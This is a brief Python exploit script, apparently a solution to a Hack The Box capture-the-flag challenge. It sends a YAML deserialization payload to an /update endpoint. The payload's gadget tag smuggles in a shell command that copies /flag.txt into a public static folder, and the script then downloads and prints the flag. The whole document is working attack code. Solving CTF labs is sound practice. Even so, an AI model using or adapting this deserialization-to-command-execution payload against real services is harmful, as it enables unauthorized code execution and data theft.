import sys
import requests
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <ip:port>")
    sys.exit(1)

host = sys.argv[1]
base_url = f"http://{host}"
url_exec = f"{base_url}/update"
url_flag = f"{base_url}/flag.txt"

payload = {
    "config": (
        None,
        '!!com.lean.watersnake.GetWaterLevel ["cp /flag.txt /app/build/resources/main/static/flag.txt"]'
    )
}

try:
    # Sending exploit
    requests.post(url_exec, files=payload, timeout=5)

    # Checking HTB flag
    r = requests.get(url_flag, timeout=5)
    flag_match = re.search(r'HTB\{.*?\}', r.text)

    if flag_match:
        print("Flag: ", flag_match.group(0))
    else:
        print("Flag not found.")
except Exception as e:
    print(f"Request failed: {e}")
    sys.exit(1)
